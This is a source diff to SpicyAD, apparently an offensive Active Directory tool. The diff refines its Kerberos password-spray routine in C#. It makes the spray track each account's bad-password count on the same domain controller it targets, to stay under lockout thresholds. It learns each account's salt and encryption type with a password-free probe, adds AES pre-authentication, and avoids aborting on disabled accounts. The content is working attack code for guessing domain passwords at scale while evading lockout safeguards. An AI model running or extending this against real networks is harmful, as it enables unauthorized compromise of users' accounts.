@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.DirectoryServices;
 using System.DirectoryServices.AccountManagement;
@@ -520,10 +520,20 @@ namespace SpicyAD
                     return;
                 }
 
+                // Resolve the KDC up-front: every badPwdCount read AND the AS-REQ must target
+                // the same DC, because badPwdCount is not replicated between DCs.
+                string kdcHost = GetKdcHost();
+                if (string.IsNullOrEmpty(kdcHost))
+                {
+                    Console.WriteLine("[!] Could not determine KDC host.");
+                    return;
+                }
+                Console.WriteLine($"[+] Using KDC: {kdcHost}\n");
+
                 // Step 3: Check current badPwdCount status for all users
                 Console.WriteLine("[*] Step 3: Checking badPwdCount for all users (fresh query)...\n");
 
-                var userBadPwdCount = GetAllUsersBadPwdCount();
+                var userBadPwdCount = GetAllUsersBadPwdCount(kdcHost);
 
                 int safeCount = 0;
                 int riskyCount = 0;
@@ -585,22 +595,15 @@ namespace SpicyAD
                 // Step 4: Perform the spray with real-time badPwdCount checking
                 Console.WriteLine($"\n[*] Step 4: Spraying via Kerberos AS-REQ...\n");
 
-                string kdcHost = GetKdcHost();
-                if (string.IsNullOrEmpty(kdcHost))
-                {
-                    Console.WriteLine("[!] Could not determine KDC host.");
-                    return;
-                }
-                Console.WriteLine($"[+] Using KDC: {kdcHost}\n");
-
                 List<string> validCredentials = new List<string>();
                 int testedCount = 0;
                 int skippedCount = 0;
 
                 foreach (string username in allUsers)
                 {
-                    // IMPORTANT: Check badPwdCount FRESH before EACH attempt
-                    int currentBadPwd = GetUserBadPwdCount(username);
+                    // IMPORTANT: Check badPwdCount FRESH before EACH attempt, on the SAME DC
+                    // we will send the AS-REQ to (badPwdCount is not replicated).
+                    int currentBadPwd = GetUserBadPwdCount(username, kdcHost);
 
                     if (currentBadPwd >= safeThreshold)
                     {
@@ -637,17 +640,26 @@ namespace SpicyAD
                             break;
 
                         case KerberosAuthResult.AccountLocked:
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine($"[!] {username}: Account LOCKED OUT - stopping spray!");
-                            Console.WriteLine("[!] Spray aborted to prevent further lockouts.");
-                            Console.ResetColor();
-                            goto EndSpray;
+                            // KDC_ERR_CLIENT_REVOKED (18) is overloaded by AD for disabled,
+                            // expired AND locked-out accounts. Disambiguate against lockoutTime
+                            // on the SAME DC we sprayed so we only abort on a genuine lockout
+                            // (a merely-disabled account must not stop the whole spray).
+                            if (IsAccountLockedOut(kdcHost, username))
+                            {
+                                Console.ForegroundColor = ConsoleColor.Red;
+                                Console.WriteLine($"[!] {username}: Account LOCKED OUT - stopping spray!");
+                                Console.WriteLine("[!] Spray aborted to prevent further lockouts.");
+                                Console.ResetColor();
+                                goto EndSpray;
+                            }
+                            OutputHelper.Verbose($"[-] {username}: Account disabled/revoked (not locked) - skipping");
+                            break;
 
                         case KerberosAuthResult.InvalidCredentials:
                         case KerberosAuthResult.PreAuthRequired:
                             OutputHelper.Verbose($"[-] {username}: Invalid password");
-                            // Check if badPwdCount increased after failed attempt
-                            int newBadPwd = GetUserBadPwdCount(username);
+                            // Check if badPwdCount increased after failed attempt (same DC)
+                            int newBadPwd = GetUserBadPwdCount(username, kdcHost);
                             if (newBadPwd > currentBadPwd)
                             {
                                 OutputHelper.Verbose($"[*] {username}: badPwdCount increased {currentBadPwd} -> {newBadPwd}");
@@ -721,8 +733,26 @@ namespace SpicyAD
         {
             try
             {
-                // Build AS-REQ with PA-ENC-TIMESTAMP (pre-authentication)
-                byte[] asReq = BuildAsReqWithPreAuth(domain, username, password);
+                // First, ask the KDC what salt/etype/iterations this principal actually uses.
+                // This is a no-password probe (does not touch badPwdCount) and makes AES pre-auth
+                // reliable for renamed principals, machine accounts, and non-default realms.
+                EtypeInfo info = GetEtypeInfo(kdcHost, domain, username);
+                if (info != null)
+                {
+                    OutputHelper.Verbose($"[*] {username}: KDC etype={info.Etype} salt={(info.Salt ?? "<default>")} iter={(info.Iterations?.ToString() ?? "4096")}");
+                }
+                else
+                {
+                    // No PA-ETYPE-INFO2 came back. We fall back to AES256 with a guessed
+                    // (REALM+principal) salt. For AES-only accounts whose salt differs from the
+                    // default (renamed principals, custom UPNs) this yields PREAUTH_FAILED, i.e.
+                    // a FALSE "invalid password" rather than a real failure. Surface it so the
+                    // operator doesn't mistake it for a wrong credential.
+                    OutputHelper.Verbose($"[!] {username}: KDC returned no ETYPE-INFO2; falling back to AES256 + default salt (result may be a false negative)");
+                }
+
+                // Build AS-REQ with PA-ENC-TIMESTAMP (pre-authentication) using the real params
+                byte[] asReq = BuildAsReqWithPreAuth(domain, username, password, info);
 
                 // Send to KDC
                 byte[] response = SendToKdc(kdcHost, 88, asReq);
@@ -742,9 +772,40 @@ namespace SpicyAD
             }
         }
 
+        /// Build a probe AS-REQ with NO PA-ENC-TIMESTAMP (only PA-PAC-REQUEST). The KDC will
+        /// reject it with PREAUTH_REQUIRED but include PA-ETYPE-INFO2, which tells us the real
+        /// salt / etype / iteration count for this principal. No password is sent, so this does
+        /// not affect badPwdCount.
+        private static byte[] BuildAsReqNoPreAuth(string realm, string username)
+        {
+            byte[] paPacRequest = BuildPaPacRequest(true);
+            byte[] reqBody = BuildKdcReqBody(realm, username);
+
+            List<byte> kdcReq = new List<byte>();
+            kdcReq.AddRange(BuildContextTag(1, BuildInteger(5)));   // pvno
+            kdcReq.AddRange(BuildContextTag(2, BuildInteger(10)));  // msg-type AS-REQ
+
+            // padata [3] with only PA-PAC-REQUEST (no enc-timestamp)
+            List<byte> padataSeq = new List<byte>();
+            padataSeq.AddRange(paPacRequest);
+            kdcReq.AddRange(BuildContextTag(3, BuildSequence(padataSeq.ToArray())));
+
+            kdcReq.AddRange(BuildContextTag(4, reqBody)); // req-body
+
+            byte[] kdcReqBytes = BuildSequence(kdcReq.ToArray());
+
+            List<byte> asReq = new List<byte>();
+            asReq.Add(0x6A); // APPLICATION 10
+            asReq.AddRange(BuildLength(kdcReqBytes.Length));
+            asReq.AddRange(kdcReqBytes);
+            return asReq.ToArray();
+        }
+
         
-        /// Build AS-REQ with PA-ENC-TIMESTAMP pre-authentication
-        private static byte[] BuildAsReqWithPreAuth(string domain, string username, string password)
+        /// Build AS-REQ with PA-ENC-TIMESTAMP pre-authentication.
+        /// If <paramref name="info"/> is supplied (from PA-ETYPE-INFO2) its etype, salt and
+        /// iteration count are used; otherwise we fall back to AES256 with the default salt.
+        private static byte[] BuildAsReqWithPreAuth(string domain, string username, string password, EtypeInfo info = null)
         {
             string realm = domain.ToUpper();
 
@@ -752,12 +813,37 @@ namespace SpicyAD
             DateTime now = DateTime.UtcNow;
             byte[] timestamp = BuildPaEncTimestamp(now);
 
-            // Encrypt timestamp with user's key (derived from password)
-            byte[] userKey = DeriveKeyFromPassword(password, realm, username);
-            byte[] encryptedTimestamp = RC4Encrypt(userKey, timestamp, 1); // key usage 1 for PA-ENC-TIMESTAMP
+            byte[] encryptedTimestamp;
+            int paEtype;
 
-            // Build PA-ENC-TIMESTAMP
-            byte[] paEncTimestamp = BuildPaData(2, encryptedTimestamp); // PA-ENC-TIMESTAMP = 2
+            // Decide the etype: trust the KDC's advertised value if we have it.
+            int chosenEtype = info != null ? info.Etype : KerberosAES.ETYPE_AES256;
+
+            if (chosenEtype == 23) // RC4-HMAC
+            {
+                byte[] rc4Key = DeriveKeyFromPassword(password, realm, username);
+                encryptedTimestamp = RC4Encrypt(rc4Key, timestamp, 1); // key usage 1
+                paEtype = 23;
+            }
+            else
+            {
+                // AES128 (17) or AES256 (18)
+                paEtype = (chosenEtype == KerberosAES.ETYPE_AES128)
+                    ? KerberosAES.ETYPE_AES128 : KerberosAES.ETYPE_AES256;
+
+                // Use the KDC-supplied salt if present, else the default REALM+principal.
+                string salt = (info != null && !string.IsNullOrEmpty(info.Salt))
+                    ? info.Salt : (realm + username);
+
+                int iterations = (info != null && info.Iterations.HasValue && info.Iterations.Value > 0)
+                    ? info.Iterations.Value : 4096;
+
+                byte[] aesKey = KerberosAES.StringToKey(password, salt, paEtype, iterations);
+                encryptedTimestamp = KerberosAES.Encrypt(aesKey, timestamp, 1, paEtype); // key usage 1
+            }
+
+            // Build PA-ENC-TIMESTAMP with the matching etype in the EncryptedData wrapper
+            byte[] paEncTimestamp = BuildPaData(2, encryptedTimestamp, paEtype); // PA-ENC-TIMESTAMP = 2
 
             // Build PA-PAC-REQUEST
             byte[] paPacRequest = BuildPaPacRequest(true);
@@ -818,7 +904,7 @@ namespace SpicyAD
             return BuildSequence(paEncTs.ToArray());
         }
 
-        private static byte[] BuildPaData(int paDataType, byte[] paDataValue)
+        private static byte[] BuildPaData(int paDataType, byte[] paDataValue, int etype = 23)
         {
             // PA-DATA ::= SEQUENCE {
             //     padata-type [1] INTEGER,
@@ -836,8 +922,10 @@ namespace SpicyAD
                 //     etype [0] INTEGER,
                 //     cipher [2] OCTET STRING
                 // }
+                // The etype here MUST match the algorithm used to encrypt the timestamp,
+                // otherwise the KDC returns PREAUTH_FAILED for everyone.
                 List<byte> encData = new List<byte>();
-                encData.AddRange(BuildContextTag(0, BuildInteger(23))); // RC4-HMAC
+                encData.AddRange(BuildContextTag(0, BuildInteger(etype)));
                 encData.AddRange(BuildContextTag(2, BuildOctetString(paDataValue)));
 
                 padata.AddRange(BuildContextTag(2, BuildOctetString(BuildSequence(encData.ToArray()))));
@@ -1070,6 +1158,142 @@ namespace SpicyAD
             }
         }
 
+        /// <summary>
+        /// Salt / etype / iteration info advertised by the KDC in PA-ETYPE-INFO2.
+        /// Null fields mean "use the default" (default salt = REALM+principal, default iter = 4096).
+        /// </summary>
+        internal class EtypeInfo
+        {
+            public int Etype;
+            public string Salt;        // null => caller builds default salt
+            public int? Iterations;    // null => 4096
+        }
+
+        /// <summary>
+        /// Send a probe AS-REQ with NO pre-auth to elicit PA-ETYPE-INFO2 from the KDC, then
+        /// parse out the preferred etype, salt, and iteration count. This avoids guessing the
+        /// salt (which breaks for renamed principals, machine accounts, or non-default realms).
+        /// Returns the best (highest-strength) AES entry, or null if none was advertised.
+        /// </summary>
+        private static EtypeInfo GetEtypeInfo(string kdcHost, string domain, string username)
+        {
+            try
+            {
+                byte[] probe = BuildAsReqNoPreAuth(domain.ToUpper(), username);
+                byte[] resp = SendToKdc(kdcHost, 88, probe);
+                if (resp == null || resp.Length == 0)
+                    return null;
+                return ParseEtypeInfo2(resp);
+            }
+            catch (Exception ex)
+            {
+                OutputHelper.Verbose($"[!] GetEtypeInfo error for {username}: {ex.Message}");
+                return null;
+            }
+        }
+
+        /// <summary>
+        /// Walk a KRB-ERROR's e-data looking for PA-ETYPE-INFO2 (padata-type 19). Each
+        /// ETYPE-INFO2-ENTRY ::= SEQUENCE { etype [0] Int32, salt [1] KerberosString OPTIONAL,
+        /// s2kparams [2] OCTET STRING OPTIONAL }. We pick AES256 > AES128 > (else first).
+        /// This is a tolerant scan rather than a full ASN.1 decoder, matching the style of the
+        /// existing error-code scan in this file.
+        /// </summary>
+        private static EtypeInfo ParseEtypeInfo2(byte[] resp)
+        {
+            // Locate the PA-ETYPE-INFO2 padata-type marker: INTEGER 19 == 02 01 13
+            // inside a padata-type [1] (0xA1) context tag: A1 03 02 01 13
+            EtypeInfo best = null;
+            for (int i = 0; i < resp.Length - 5; i++)
+            {
+                if (resp[i] == 0xA1 && resp[i + 1] == 0x03 &&
+                    resp[i + 2] == 0x02 && resp[i + 3] == 0x01 && resp[i + 4] == 0x13)
+                {
+                    // The following padata-value [2] (0xA2) holds an OCTET STRING wrapping
+                    // SEQUENCE OF ETYPE-INFO2-ENTRY. Scan forward for entries.
+                    var entries = ScanEtypeInfo2Entries(resp, i + 5);
+                    foreach (var e in entries)
+                    {
+                        if (best == null) best = e;
+                        else if (e.Etype == KerberosAES.ETYPE_AES256) best = e;          // prefer AES256
+                        else if (e.Etype == KerberosAES.ETYPE_AES128 &&
+                                 best.Etype != KerberosAES.ETYPE_AES256) best = e;        // else AES128
+                    }
+                    break;
+                }
+            }
+            return best;
+        }
+
+        // Tolerant scan: find each ETYPE-INFO2-ENTRY SEQUENCE (0x30) after the padata marker,
+        // pull etype from [0] (A0 .. 02 01 XX) and optional salt from [1] (A1 .. 1B/GeneralString
+        // or 04/OCTET). Stops at the next padata-type tag or end of buffer.
+        private static List<EtypeInfo> ScanEtypeInfo2Entries(byte[] resp, int start)
+        {
+            var list = new List<EtypeInfo>();
+            int i = start;
+            int guard = 0;
+            while (i < resp.Length - 4 && guard++ < 64)
+            {
+                // entry begins with SEQUENCE
+                if (resp[i] == 0x30)
+                {
+                    int entryLen = resp[i + 1];
+                    int entryEnd = Math.Min(resp.Length, i + 2 + entryLen);
+                    int j = i + 2;
+                    int etype = -1;
+                    string salt = null;
+                    int? iters = null;
+
+                    while (j < entryEnd - 2)
+                    {
+                        if (resp[j] == 0xA0 && resp[j + 1] >= 0x03 &&
+                            resp[j + 2] == 0x02 && resp[j + 3] == 0x01)
+                        {
+                            etype = resp[j + 4];
+                            j += 5;
+                        }
+                        else if (resp[j] == 0xA1) // salt [1]
+                        {
+                            int saltCtxLen = resp[j + 1];
+                            // inner string: tag (0x1B GeneralString or 0x04 OCTET STRING), len, bytes
+                            int strTag = resp[j + 2];
+                            int strLen = resp[j + 3];
+                            if ((strTag == 0x1B || strTag == 0x04) && j + 4 + strLen <= entryEnd)
+                                salt = Encoding.UTF8.GetString(resp, j + 4, strLen);
+                            j += 2 + saltCtxLen;
+                        }
+                        else if (resp[j] == 0xA2) // s2kparams [2] -> 4-byte big-endian iteration count
+                        {
+                            int pCtxLen = resp[j + 1];
+                            int octTag = resp[j + 2];
+                            int octLen = resp[j + 3];
+                            if (octTag == 0x04 && octLen == 4 && j + 4 + 4 <= entryEnd)
+                            {
+                                iters = (resp[j + 4] << 24) | (resp[j + 5] << 16) |
+                                        (resp[j + 6] << 8) | resp[j + 7];
+                            }
+                            j += 2 + pCtxLen;
+                        }
+                        else
+                        {
+                            j++;
+                        }
+                    }
+
+                    if (etype != -1)
+                        list.Add(new EtypeInfo { Etype = etype, Salt = salt, Iterations = iters });
+
+                    i = entryEnd;
+                }
+                else
+                {
+                    i++;
+                }
+            }
+            return list;
+        }
+
         private static KerberosAuthResult ParseKdcResponse(byte[] response)
         {
             if (response == null || response.Length < 10)
@@ -1100,16 +1324,21 @@ namespace SpicyAD
                         {
                             case 6:  // KDC_ERR_C_PRINCIPAL_UNKNOWN
                                 return KerberosAuthResult.InvalidCredentials;
-                            case 18: // KDC_ERR_CLIENT_REVOKED (disabled)
-                                return KerberosAuthResult.AccountDisabled;
+                            case 18: // KDC_ERR_CLIENT_REVOKED
+                                // AD overloads this for disabled, expired, AND locked-out
+                                // accounts. The lockout bit must be disambiguated by the caller
+                                // via badPwdCount/lockoutTime; treat it as a lockout signal so
+                                // the spray can stop rather than silently continuing.
+                                return KerberosAuthResult.AccountLocked;
                             case 23: // KDC_ERR_KEY_EXPIRED (password expired)
                                 return KerberosAuthResult.PasswordExpired;
-                            case 24: // KDC_ERR_PREAUTH_FAILED
+                            case 24: // KDC_ERR_PREAUTH_FAILED (wrong password)
                                 return KerberosAuthResult.InvalidCredentials;
                             case 25: // KDC_ERR_PREAUTH_REQUIRED
                                 return KerberosAuthResult.PreAuthRequired;
-                            case 37: // KDC_ERR_CLIENT_NOT_TRUSTED (locked)
-                                return KerberosAuthResult.AccountLocked;
+                            case 37: // KRB_AP_ERR_SKEW (clock skew) - not a lockout
+                                OutputHelper.Verbose("[!] Clock skew (KRB_AP_ERR_SKEW) - check time sync with KDC");
+                                return KerberosAuthResult.Error;
                             default:
                                 OutputHelper.Verbose($"[*] KRB error code: {errorCode}");
                                 return KerberosAuthResult.Error;
@@ -1169,12 +1398,27 @@ namespace SpicyAD
         }
 
         
-        /// Get badPwdCount for a single user (fresh query, no cache)
-        private static int GetUserBadPwdCount(string username)
+        /// <summary>
+        /// Bind a DirectoryEntry against a SPECIFIC DC. badPwdCount is a non-replicated
+        /// attribute (it lives only on the DC that processed the failed logon), so the safety
+        /// check MUST query the same DC we send the AS-REQ to. Binding through the generic
+        /// AuthContext entry can land on a different DC (DNS round-robin) and read a stale
+        /// count, defeating the lockout protection.
+        /// </summary>
+        private static DirectoryEntry GetDirectoryEntryForDc(string server)
+        {
+            if (string.IsNullOrEmpty(server))
+                return AuthContext.GetDirectoryEntry();
+            return AuthContext.GetDirectoryEntry($"LDAP://{server}");
+        }
+
+        /// Get badPwdCount for a single user (fresh query, no cache) from a specific DC.
+        /// Pass the same host used for the AS-REQ so the count is authoritative.
+        private static int GetUserBadPwdCount(string username, string server = null)
         {
             try
             {
-                DirectoryEntry de = AuthContext.GetDirectoryEntry();
+                DirectoryEntry de = GetDirectoryEntryForDc(server);
                 DirectorySearcher searcher = new DirectorySearcher(de);
                 searcher.Filter = $"(&(objectClass=user)(samAccountName={username}))";
                 searcher.PropertiesToLoad.Add("badPwdCount");
@@ -1194,15 +1438,47 @@ namespace SpicyAD
             return 0;
         }
 
+        /// <summary>
+        /// Confirm whether an account is genuinely locked out (vs merely disabled/expired,
+        /// which AD also reports as KDC_ERR_CLIENT_REVOKED). Checks lockoutTime on the SAME DC
+        /// the spray hit; a non-zero lockoutTime means locked. Defaults to false on any error so
+        /// a transient lookup failure doesn't abort the whole spray.
+        /// </summary>
+        private static bool IsAccountLockedOut(string server, string username)
+        {
+            try
+            {
+                DirectoryEntry de = GetDirectoryEntryForDc(server);
+                DirectorySearcher searcher = new DirectorySearcher(de);
+                searcher.Filter = $"(&(objectClass=user)(samAccountName={username}))";
+                searcher.PropertiesToLoad.Add("lockoutTime");
+                searcher.CacheResults = false;
+
+                SearchResult result = searcher.FindOne();
+                if (result != null && result.Properties.Contains("lockoutTime") && result.Properties["lockoutTime"].Count > 0)
+                {
+                    long lockoutTime = Convert.ToInt64(result.Properties["lockoutTime"][0]);
+                    // lockoutTime == 0 means never/cleared; non-zero means currently locked.
+                    return lockoutTime != 0;
+                }
+            }
+            catch (Exception ex)
+            {
+                OutputHelper.Verbose($"[!] Error checking lockoutTime for {username}: {ex.Message}");
+            }
+
+            return false;
+        }
+
         
-        /// Get badPwdCount for all users (batch query for initial check)
-        private static Dictionary<string, int> GetAllUsersBadPwdCount()
+        /// Get badPwdCount for all users (batch query for initial check) from a specific DC.
+        private static Dictionary<string, int> GetAllUsersBadPwdCount(string server = null)
         {
             var result = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
 
             try
             {
-                DirectoryEntry de = AuthContext.GetDirectoryEntry();
+                DirectoryEntry de = GetDirectoryEntryForDc(server);
                 DirectorySearcher searcher = new DirectorySearcher(de);
                 searcher.Filter = "(&(objectClass=user)(objectCategory=person))";
                 searcher.PropertiesToLoad.Add("samAccountName");
